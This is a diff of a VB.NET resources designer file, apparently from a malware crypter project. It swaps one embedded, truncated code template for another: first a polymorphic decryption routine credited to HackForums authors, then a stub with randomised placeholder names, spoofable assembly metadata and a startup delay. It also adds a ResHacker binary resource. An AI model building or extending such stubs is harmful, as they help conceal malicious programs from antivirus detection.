@@ -61,20 +61,34 @@ Namespace My.Resources
         End Property
         
         '''<summary>
-        '''  Looks up a localized string similar to Imports System, System.IO, Microsoft.VisualBasic
-        '''Module ΦM1Φ
-        '''Public Function ΦF1Φ(ByVal input As String, ByVal key As String) As String
-        '''        &apos;This function decrypts text that was encrypted with the Polymorphic encrypter in this class.
-        '''        &apos;All credits to Ethereal of HackForums.net
-        '''		&apos;Modified slightly by KrypteX for CodeDom string randomization
-        '''        &apos;Please leave the credits.
-        '''        Dim ΦS1Φ As Char() = input.ToCharArray()
-        '''        Dim ΦS2Φ As Char() = key.ToCharArray()
-        '''        Dim ΦS3Φ A [rest of string was truncated]&quot;;.
+        '''  Looks up a localized string similar to Imports System, System.IO, Microsoft.VisualBasic, System.Reflection
+        '''&lt;Assembly: AssemblyTitle(&quot;ΦA1Φ&quot;)&gt; 
+        '''&lt;Assembly: AssemblyDescription(&quot;ΦA2Φ&quot;)&gt; 
+        '''&lt;Assembly: AssemblyCompany(&quot;ΦA3Φ&quot;)&gt; 
+        '''&lt;Assembly: AssemblyProduct(&quot;ΦA4Φ&quot;)&gt; 
+        '''&lt;Assembly: AssemblyCopyright(&quot;ΦA5Φ&quot;)&gt; 
+        '''&lt;Assembly: AssemblyTrademark(&quot;ΦA6Φ&quot;)&gt; 
+        '''&lt;Assembly: AssemblyVersion(&quot;1.4.1.7&quot;)&gt; 
+        '''&lt;Assembly: AssemblyFileVersion(&quot;1.5.1.7&quot;)&gt; 
+        '''Namespace ΦN1Φ
+        '''    Public Class ΦM1Φ
+        '''        Public Shared Sub Main()
+        '''            Threading.Thread.Sleep(1500)
+        '''         [rest of string was truncated]&quot;;.
         '''</summary>
         Friend ReadOnly Property bubby() As String
             Get
                 Return ResourceManager.GetString("bubby", resourceCulture)
+            End Get
+        End Property
+        
+        '''<summary>
+        '''  Looks up a localized resource of type System.Byte[].
+        '''</summary>
+        Friend ReadOnly Property ResHacker() As Byte()
+            Get
+                Dim obj As Object = ResourceManager.GetObject("ResHacker", resourceCulture)
+                Return CType(obj,Byte())
             End Get
         End Property
     End Module
